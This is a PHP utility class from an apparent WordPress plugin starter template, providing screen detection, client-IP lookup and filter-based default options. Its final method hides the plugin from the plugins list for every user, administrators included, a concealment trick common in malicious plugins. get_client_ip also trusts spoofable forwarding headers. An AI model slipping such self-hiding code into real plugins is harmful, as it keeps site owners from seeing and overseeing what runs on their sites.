<?php
namespace MosPress\PluginStarter\Helpers;
if ( ! defined( 'ABSPATH' ) ) exit;
use WP_Roles;
class Utils {
	public static function plugin_starter_is_plugin_page()
	{
		if (function_exists('get_current_screen')) {
			$current_screen = get_current_screen();
			// var_dump($current_screen->id);
			$pages = [];
			if (
				$current_screen->id == 'toplevel_page_plugin-starter'
				|| in_array($current_screen->id, $pages)
			) {
				return true;
			}
		}
		return false;
	}
	/**
	 * Get the client's IP address.
	 *
	 * @return string The client's IP address.
	 */
	public static function get_client_ip()
	{
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
			return sanitize_text_field( wp_unslash($_SERVER['HTTP_CLIENT_IP']));
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			return sanitize_text_field( wp_unslash($_SERVER['HTTP_X_FORWARDED_FOR']));
		} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
			return sanitize_text_field( wp_unslash($_SERVER['REMOTE_ADDR']));
		}
	}

	public static function plugin_starter_get_default_options()
	{
		$plugin_starter_default_options = [];
		$plugin_starter_default_options = apply_filters('plugin_starter_default_options_modify', $plugin_starter_default_options);
		return $plugin_starter_default_options;
	}

	public static function plugin_starter_get_default_options_details()
	{
		$plugin_starter_default_options_details = [];
		$plugin_starter_default_options_details = apply_filters('plugin_starter_default_options_details_modify', $plugin_starter_default_options_details);
		return $plugin_starter_default_options_details;
	}
	public static function plugin_starter_get_default_colors()
	{
		$plugin_starter_default_colors = [];
		$plugin_starter_default_colors = apply_filters('plugin_starter_default_colors_modify', $plugin_starter_default_colors);
		return $plugin_starter_default_colors;
	}

	public static function plugin_starter_get_default_gradients()
	{
		$plugin_starter_default_gradients = [];
		$plugin_starter_default_gradients = apply_filters('plugin_starter_default_gradients_modify', $plugin_starter_default_gradients);
		return $plugin_starter_default_gradients;
	}

	public static function plugin_starter_get_default_tables()
	{
		$plugin_starter_default_tables = [];
		$plugin_starter_default_tables = apply_filters('plugin_starter_default_tables_modify', $plugin_starter_default_tables);
		return $plugin_starter_default_tables;
	}

	// update_option('plugin_starter_options', plugin_starter_get_default_options());

	public static function plugin_starter_get_option()
	{
		$plugin_starter_options_database = get_option('plugin_starter_options', []);
		$plugin_starter_options = array_replace_recursive(self::plugin_starter_get_default_options(), $plugin_starter_options_database);
		return $plugin_starter_options;
	}
	public static function plugin_starter_get_option_details()
	{
		return self::plugin_starter_get_default_options_details();
	}

	public static function plugin_starter_hide_plugin_from_list($plugins) {
		// Only hide for non-administrators or specific users
		if (current_user_can('administrator')) {
			// Optionally hide even from admins
			// unset($plugins['plugin-starter/plugin-starter.php']);
		}

		// Hide from all users
		unset($plugins['plugin-starter/plugin-starter.php']);

		return $plugins;
	}
}